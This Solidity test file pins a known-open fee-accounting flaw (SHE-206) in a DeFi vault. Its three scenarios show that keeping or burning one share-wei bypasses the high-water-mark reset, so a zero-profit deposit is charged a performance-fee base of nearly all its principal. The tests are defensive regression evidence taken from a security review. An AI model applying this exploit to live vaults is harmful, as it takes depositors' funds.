// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {SyndicateVault} from "../../src/SyndicateVault.sol";
import {ISyndicateVault} from "../../src/interfaces/ISyndicateVault.sol";
import {VaultWithdrawalQueue} from "../../src/queue/VaultWithdrawalQueue.sol";
import {BatchExecutorLib} from "../../src/BatchExecutorLib.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20Mock} from "../mocks/ERC20Mock.sol";
import {MockAgentRegistry} from "../mocks/MockAgentRegistry.sol";

/// @title Vault_she206ResidualDustBypass
///
/// @notice KNOWN-OPEN SHE-206 — the remainder the pricing-supply fix does NOT
///         close. Every test here PASSES, and each one asserts a phantom
///         performance-fee base that the vault charges TODAY, on this branch,
///         with `Vault_she206HwmPricingSupply.t.sol`'s fix in place.
///
///         These are pins, not regressions. They exist so the residual has a
///         number attached to it in the repo rather than only in a review
///         comment, and so a real fix has to flip them ON PURPOSE — a green
///         suite must not be readable as "SHE-206 is closed".
///
/// @dev    WHY THE FIX DOES NOT REACH THIS. The sibling file moves the reset,
///         the seed and the ratchet from `totalSupply()` onto
///         `_pricingSupply()`, and every one of those guards tests
///         `_pricingSupply() == 0`. But the pathology is not "the pricing
///         supply is empty" — it is "the pricing supply is negligible next to
///         the virtual offset". `pricePerShare()` divides by
///         `_pricingSupply() + 10 ** _decimalsOffset()`, so ONE share-wei of
///         live supply is worth nothing at all against a `1e12` offset while
///         being infinitely far from the `== 0` the guards ask about. The
///         exact arithmetic that made the original finding a High is still
///         there; only the trigger moved, from "hold zero shares back" to
///         "hold one wei back".
///
///         WHAT IT COSTS. Alice takes a completely ordinary async exit and
///         keeps a single share-wei — or, in the third test, sends that wei to
///         `0xdEaD` so nobody can ever undo it. Bob's next 10,000 USDC deposit,
///         with zero P&L anywhere in the sequence, is charged 9,999.990001 USDC
///         of performance-fee base: 99.9999% of his own principal. With no
///         donation at all the stamp's own rounding dust (one wei of
///         `totalAssets`) still yields 4,999.994999. Both figures are
///         byte-identical to the ones the base commit produces, which is the
///         cleanest statement of the residual: for this attack the fix changed
///         nothing except the price of entry, which is one wei.
///
///         Still no privileged position, and now permanent: `_pricingSupply()`
///         can never return to 0 while that wei exists, so the reset is
///         disabled for the vault's whole life, not just one epoch.
///
/// @dev    DIRECTION OF A REAL FIX — and why the obvious one is not it.
///         Widening the guards to `_pricingSupply() < 10 ** _decimalsOffset()`
///         is NOT sufficient. It buys nothing at the boundary: at exactly one
///         unit share the price per share is still unbounded above, because
///         `totalAssets` is not bounded below by anything the vault controls —
///         a bare ERC20 transfer can set it to any value it likes, which is the
///         donation amplifier the ticket already lists as secondary. A
///         threshold only moves the wei count an attacker has to hold; it does
///         not remove the division that makes the mark meaningless. It also
///         introduces its own failure: a real fund whose live supply is
///         legitimately below the offset would have its mark silently reset.
///
///         The principled fix is the ticket's "secondary" item: INTERNAL ASSET
///         ACCOUNTING. Once `totalAssets()` tracks deposits and settlements
///         rather than `balanceOf(this)`, the numerator stops being
///         attacker-controlled and the price per share stops being able to
///         exceed the mark by an arbitrary factor on zero P&L — which is the
///         actual invariant, and the one a supply threshold never gets to. That
///         is not a two-day change, so SHE-206 stays OPEN with this file as its
///         standing evidence.
///
/// @dev    PROVENANCE: reproduced from the adversarial review of PR #300. The
///         three scenarios and the three figures are the reviewer's; the
///         assertions are added here so they run in CI instead of being read
///         once and forgotten.
contract VaultShe206ResidualDustBypassTest is Test {
    SyndicateVault internal vault;
    VaultWithdrawalQueue internal queue;
    BatchExecutorLib internal executorLib;
    ERC20Mock internal usdc;
    MockAgentRegistry internal agentRegistry;

    address internal owner = makeAddr("owner");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal donor = makeAddr("donor");
    address internal constant MOCK_GOVERNOR = address(0xF00D);

    /// @dev The burn address the third scenario parks the dust at, to show the
    ///      bypass survives its own author walking away from it.
    address internal constant DEAD = address(0xdEaD);

    uint256 internal constant EPOCH1 = 1_000e6;
    /// @dev The re-seeding deposit that gets charged. 10,000 USDC.
    uint256 internal constant EPOCH2 = 10_000e6;
    /// @dev One whole USDC of residue behind the near-empty pricing supply.
    uint256 internal constant RESIDUE = 1e6;

    // KNOWN-OPEN SHE-206 — the three figures below are what the vault charges
    // on this branch. They are NOT targets; a real fix drives all three to 0
    // and must update this file deliberately when it does.

    /// @dev `d·r/(r+1)` with one share-wei of live supply and one whole USDC of
    ///      residue: 9,999.990001 USDC of fee base on a 10,000 USDC zero-P&L
    ///      deposit.
    uint256 internal constant RESIDUAL_FEE_BASE_WITH_DONATION = 9_999_990_001;
    /// @dev The same bypass with NO donation whatsoever — the one wei of
    ///      `totalAssets` the settlement stamp leaves behind is enough on its
    ///      own: 4,999.994999 USDC.
    uint256 internal constant RESIDUAL_FEE_BASE_NO_DONATION = 4_999_994_999;

    function setUp() public {
        usdc = new ERC20Mock("USD Coin", "USDC", 6);
        executorLib = new BatchExecutorLib();
        agentRegistry = new MockAgentRegistry();

        SyndicateVault impl = new SyndicateVault();
        bytes memory initData = abi.encodeCall(
            SyndicateVault.initialize,
            (ISyndicateVault.InitParams({
                    asset: address(usdc),
                    name: "Sherwood Vault",
                    symbol: "swUSDC",
                    owner: owner,
                    executorImpl: address(executorLib),
                    openDeposits: true,
                    agentRegistry: address(agentRegistry),
                    managementFeeBps: 0
                }))
        );
        vault = SyndicateVault(payable(address(new ERC1967Proxy(address(impl), initData))));

        // Test contract acts as factory; queue is deployed and bound by it.
        queue = new VaultWithdrawalQueue(address(vault));
        vault.setWithdrawalQueue(address(queue));

        vm.mockCall(address(this), abi.encodeWithSignature("governorOf(address)"), abi.encode(MOCK_GOVERNOR));
        vm.mockCall(MOCK_GOVERNOR, abi.encodeWithSignature("getActiveProposal()"), abi.encode(uint256(0)));
        vm.mockCall(MOCK_GOVERNOR, abi.encodeWithSignature("openProposalCount()"), abi.encode(uint256(0)));
        vm.mockCall(MOCK_GOVERNOR, abi.encodeWithSignature("getCapitalSnapshot(uint256)"), abi.encode(uint256(0)));

        usdc.mint(alice, 100_000e6);
        usdc.mint(bob, 100_000e6);
        usdc.mint(donor, 100_000e6);
        vm.prank(alice);
        usdc.approve(address(vault), type(uint256).max);
        vm.prank(bob);
        usdc.approve(address(vault), type(uint256).max);
    }

    function _setProposalActive(bool active) internal {
        vm.mockCall(
            MOCK_GOVERNOR, abi.encodeWithSignature("getActiveProposal()"), abi.encode(active ? uint256(1) : uint256(0))
        );
    }

    /// @dev The governor settling proposal 1 — the call that stamps the frozen
    ///      price into the queue and takes the pricing supply down to its dust.
    function _settle() internal {
        _setProposalActive(false);
        vm.prank(MOCK_GOVERNOR);
        vault.onProposalSettled(1);
    }

    /// @dev `totalSupply()` less the queue's stamped-but-unclaimed shares — the
    ///      quantity `SyndicateVault._pricingSupply()` computes and every guard
    ///      SHE-206 touched compares against zero.
    function _pricingSupply() internal view returns (uint256) {
        uint256 supply = vault.totalSupply();
        uint256 stamped = queue.stampedUnclaimedShares();
        return supply > stamped ? supply - stamped : 0;
    }

    /// @dev Epoch 1: alice deposits and exits through the async queue, holding
    ///      back exactly ONE share-wei. That wei is the whole exploit.
    /// @return mark1 the epoch-1 mark, which must survive the settlement.
    function _asyncExitKeepingOneWei() internal returns (uint256 mark1) {
        vm.prank(alice);
        uint256 shares = vault.deposit(EPOCH1, alice);
        mark1 = vault.highWaterPricePerShare();
        assertGt(mark1, 0, "sanity: mark seeded on the first deposit");

        _setProposalActive(true);
        vm.startPrank(alice);
        vault.approve(address(queue), shares - 1);
        vault.requestRedeem(shares - 1, alice);
        vm.stopPrank();

        _settle();

        // The state the fix's guards are looking for, missed by one wei. The
        // sibling file's `test_hwm_asyncFullExitThenReseedDepositChargesNoPerformanceFee`
        // is the SAME sequence with this value at 0, and there the fee base is
        // 0 — so this line is the entire difference between the two outcomes.
        assertEq(_pricingSupply(), 1, "one share-wei of live pricing supply is what defeats the `== 0` guards");
        assertEq(vault.highWaterPricePerShare(), mark1, "so no reset fires and the stale epoch-1 mark stands");
    }

    // =====================================================================
    // KNOWN-OPEN SHE-206 — residual bypass, asserted as current behaviour
    // =====================================================================

    /// @notice KNOWN-OPEN SHE-206. One share-wei withheld from an ordinary
    ///         async exit re-opens the original finding at full magnitude:
    ///         9,999.990001 USDC of performance-fee base charged against a
    ///         10,000 USDC deposit that has earned nothing.
    ///
    /// @dev Byte-identical to the figure the pre-fix base commit produces. The
    ///      fee base being nonzero is the finding; the exact equality is what
    ///      makes it a pin, since a partial mitigation that merely shrank the
    ///      number would otherwise slip through as "fixed".
    function test_review_residualOneWeiOfPricingSupplyKeepsTheExploit() public {
        uint256 mark1 = _asyncExitKeepingOneWei();

        // Residual assets behind the near-empty pricing supply. A bare transfer
        // is simply the source with the fewest moving parts; redeem flooring
        // and the queue's dust release reach the same state.
        vm.prank(donor);
        usdc.transfer(address(vault), RESIDUE);

        // Epoch 2. Bob's money has been in the vault for zero seconds.
        vm.prank(bob);
        vault.deposit(EPOCH2, bob);

        assertGt(vault.aboveHighWaterMark(), 0, "KNOWN-OPEN: zero P&L is still charged a performance-fee base");
        assertEq(
            vault.aboveHighWaterMark(),
            RESIDUAL_FEE_BASE_WITH_DONATION,
            "KNOWN-OPEN SHE-206: 9,999.990001 USDC of a 10,000 USDC deposit, unchanged from the base commit"
        );
        assertEq(vault.highWaterPricePerShare(), mark1, "the stale mark is what the deposit is measured against");
    }

    /// @notice KNOWN-OPEN SHE-206. The same bypass with NO donation at all.
    ///
    /// @dev The point of this one is that the residue does not have to be
    ///      supplied. `stampSettlement`'s own rounding leaves a single wei of
    ///      `totalAssets` behind a one-wei pricing supply, and that alone puts
    ///      the price per share two orders of magnitude above the mark — half
    ///      of bob's principal, 4,999.994999 USDC, on zero P&L. So the attack
    ///      needs no capital beyond the share-wei: there is nothing to fund and
    ///      nothing to donate.
    function test_review_residualOneWeiNoDonation() public {
        _asyncExitKeepingOneWei();
        assertEq(vault.totalAssets(), 1, "the stamp's own rounding dust, nothing added");

        vm.prank(bob);
        vault.deposit(EPOCH2, bob);

        assertGt(vault.aboveHighWaterMark(), 0, "KNOWN-OPEN: the dust alone is enough");
        assertEq(
            vault.aboveHighWaterMark(),
            RESIDUAL_FEE_BASE_NO_DONATION,
            "KNOWN-OPEN SHE-206: 4,999.994999 USDC on a zero-P&L 10,000 USDC deposit, with no donation"
        );
    }

    /// @notice KNOWN-OPEN SHE-206. The share-wei can be burned, which makes the
    ///         bypass PERMANENT and unattributable.
    ///
    /// @dev The distinguishing claim, and the reason this is not just a
    ///      restatement of the first test: alice does not have to keep custody
    ///      of anything. She sends one share-wei to `0xdEaD` before exiting in
    ///      full. `_pricingSupply()` can now never return to 0 for the lifetime
    ///      of the vault — nobody holds the position that would have to be
    ///      redeemed — so the reset is disabled forever, for every future
    ///      epoch, by a transfer that costs one wei and leaves no live
    ///      counterparty. Same fee base as holding it: 9,999.990001 USDC.
    function test_review_oneWeiToDeadAddressPermanentlyDisablesTheReset() public {
        vm.prank(alice);
        uint256 shares = vault.deposit(EPOCH1, alice);
        uint256 mark1 = vault.highWaterPricePerShare();

        vm.prank(alice);
        vault.transfer(DEAD, 1);

        _setProposalActive(true);
        vm.startPrank(alice);
        vault.approve(address(queue), shares - 1);
        vault.requestRedeem(shares - 1, alice);
        vm.stopPrank();
        _settle();

        assertEq(vault.balanceOf(alice), 0, "alice is fully out; she holds nothing");
        assertEq(vault.balanceOf(DEAD), 1, "the wei that keeps the pricing supply alive is unreachable");
        assertEq(_pricingSupply(), 1, "and it can never be redeemed, so this can never return to 0");

        vm.prank(donor);
        usdc.transfer(address(vault), RESIDUE);

        vm.prank(bob);
        vault.deposit(EPOCH2, bob);

        assertGt(vault.aboveHighWaterMark(), 0, "KNOWN-OPEN: permanently, for every future epoch");
        assertEq(
            vault.aboveHighWaterMark(),
            RESIDUAL_FEE_BASE_WITH_DONATION,
            "KNOWN-OPEN SHE-206: burning the dust costs the attacker nothing and changes nothing"
        );
        assertEq(vault.highWaterPricePerShare(), mark1, "the epoch-1 mark outlives everyone who held under it");
    }
}
